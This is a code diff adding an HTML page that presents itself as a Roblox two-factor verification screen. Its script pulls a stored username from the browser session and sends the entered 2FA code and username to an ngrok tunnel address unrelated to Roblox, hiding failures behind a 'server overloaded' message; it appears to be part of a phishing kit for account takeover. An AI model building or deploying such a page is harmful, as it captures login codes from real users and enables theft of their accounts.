@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>2FA Verification</title>
+    <link rel="stylesheet" href="../style.css">
+</head>
+<body>
+    <nav class="mobile-nav">
+        <div class="logo">
+            <span>Roblox</span>
+        </div>
+    </nav>
+    
+    <main class="main-content">
+        <div class="login-container">
+            <h1 class="login-header">2FA Verification</h1>
+            
+            <form id="2fa-form" class="login-form">
+                <div class="form-group">
+                    <input type="text" id="2fa-code" class="form-control" 
+                           placeholder="Enter 2FA Code" required>
+                </div>
+                
+                <div id="error-message" class="error-message" style="display: none;"></div>
+                
+                <button type="submit" class="login-button" id="verify-button">
+                    <span id="button-text">Verify</span>
+                    <img id="loading-gif" src="https://i.gifer.com/origin/b4/b4d657e7ef262b88eb5f7ac021edda87.gif" alt="Loading" style="display: none; height: 20px;">
+                </button>
+            </form>
+        </div>
+    </main>
+    
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const form = document.getElementById('2fa-form');
+            const verifyButton = document.getElementById('verify-button');
+            const buttonText = document.getElementById('button-text');
+            const loadingGif = document.getElementById('loading-gif');
+            const errorElement = document.getElementById('error-message');
+            
+            // Получаем сохраненные данные логина
+            const loginData = JSON.parse(sessionStorage.getItem('loginData'));
+            if (!loginData) {
+                window.location.href = '/';
+                return;
+            }
+            
+            form.addEventListener('submit', function(e) {
+                e.preventDefault();
+                
+                const code = document.getElementById('2fa-code').value.trim();
+                if (!code) {
+                    showError('Please enter 2FA code');
+                    return;
+                }
+                
+                // Show loading state
+                buttonText.style.display = 'none';
+                loadingGif.style.display = 'inline-block';
+                verifyButton.disabled = true;
+                errorElement.style.display = 'none';
+                
+                // Отправляем код на сервер
+                fetch('https://7a10160dcdab.ngrok-free.app/submit_2fa', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        code: code,
+                        username: loginData.username
+                    })
+                })
+                .then(response => {
+                    if (!response.ok) throw new Error('Server error');
+                    return response.json();
+                })
+                .then(data => {
+                    if (data.success) {
+                        window.location.href = '/verifed/index.html';
+                    } else {
+                        showError(data.error || 'Invalid 2FA code');
+                    }
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                    showError('Server is overloaded. Please try again later.');
+                })
+                .finally(() => {
+                    // Reset button state
+                    buttonText.style.display = 'inline-block';
+                    loadingGif.style.display = 'none';
+                    verifyButton.disabled = false;
+                });
+            });
+            
+            function showError(message) {
+                errorElement.textContent = message;
+                errorElement.style.display = 'block';
+            }
+        });
+    </script>
+</body>
+</html>
